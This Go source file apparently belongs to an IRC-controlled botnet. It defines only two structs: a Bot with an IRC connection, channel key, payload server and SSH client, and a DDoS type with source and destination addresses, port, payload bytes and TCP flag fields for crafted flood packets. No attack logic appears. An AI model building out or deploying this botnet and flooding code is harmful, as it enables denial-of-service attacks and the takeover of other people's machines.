package lib

import (
	"net"

	"golang.org/x/crypto/ssh"
)

type Bot struct {
	CPU               int
	payload           string
	pServer           string
	password, network string
	Channel, ChanKey  string
	IRC               net.Conn
	session           *ssh.Client
}

type DDoS struct {
	srcAddr, dstAddr                                     string
	dstPort                                              string
	ddosPayload                                          []byte
	synFlag, ackFlag, rstFlag, pshFlag, finFlag, urgFlag bool
}
